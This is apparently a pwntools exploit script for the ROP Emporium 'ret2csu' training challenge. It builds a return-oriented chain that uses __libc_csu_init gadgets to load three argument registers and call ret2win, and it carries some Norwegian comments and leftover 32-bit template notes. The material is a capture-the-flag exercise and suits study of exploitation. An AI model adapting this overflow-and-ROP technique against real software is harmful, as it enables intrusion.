#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template ./badchars32

from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or "./ret2csu")
lib = ELF("./libret2csu.so")
context.delete_corefiles = True
context.terminal = ["alacritty", "-e", "sh", "-c"]
rop = ROP(exe)
# context.log_level = "debug"

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    """Start the exploit against the target."""
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)


# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = """
break *pwnme+152
continue
""".format(
    **locals()
)

# ===========================================================
#                    EXPLOIT GOES HERE
# ===========================================================
# Arch:     i386-32-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x8048000)
# RUNPATH:  b'.'
# io = start()
# io.sendline(cyclic(100, alphabet="QWERT"))
# io.wait()

# offset = cyclic_find(io.corefile.eip, alphabet="QWERT")
# info(offset)


# def findOffset():
#     context.delete_corefiles = True
#     io = start()
#     io.sendline(cyclic(100))
#     io.wait()
#     offset = cyclic_find(io.corefile.read(io.corefile.rsp, 4))
#     info(f"Offset: {offset}")
#     context.delete_corefiles = False
#     return offset


offset = 40

io = start()

pop_rdi = rop.find_gadget(["pop rdi", "ret"])[0]
pop_rbx_rbp_r12_r13_r14_r15 = 0x40069A
csu_mov = 0x400680
# mov rdx,r15
# mov rsi,r14
# mov edi,r13d
# call QWORD PTR [r12+rbx*8]
fini_ref = 0x6003B0
# fant med "find 0x600000, 0x601000, 0x00000000004006b4" i gdb
# kjør info proc mappings for å se memory mappings

args = [0xDEADBEEFDEADBEEF, 0xCAFEBABECAFEBABE, 0xD00DF00DD00DF00D]


payload = flat(
    asm("nop") * offset,
    pop_rbx_rbp_r12_r13_r14_r15,
    -0x1,  # rbx
    0x0,  # rbp
    fini_ref + 8,  # r12 -> calles
    args[0],  # r13 -> edi
    args[1],  # r14 -> rsi
    args[2],  # r15 -> rdx
    csu_mov,
    p64(0x0) * 7,  # 7 pga rsp addes 8, altså 1 addresse opp
    pop_rdi,
    args[0],
    exe.symbols["ret2win"],
)

io.sendline(payload)

io.recvuntil(b"Thank you!\n")
success(io.recvline().decode())
